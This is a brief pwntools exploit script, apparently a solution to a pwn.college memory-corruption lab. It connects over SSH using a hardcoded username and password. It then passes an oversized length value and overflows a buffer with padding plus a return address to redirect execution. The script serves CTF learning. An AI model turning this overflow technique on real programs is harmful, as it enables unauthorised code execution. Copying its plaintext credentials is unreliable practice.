from pwn import *
context.log_level = 'debug'
s = ssh(user="ssu-csec",host="ssu-csec.pwn.college",port=22,password="djaxod12",keyfile="../../csec")

p = s.process("./babymem_level4_teaching1")
p.sendlineafter(b'size:',b'4294967295')
pay = b'A'*88 + p64(0x40205c)
p.sendafter(b'bytes)!',pay)

p.interactive()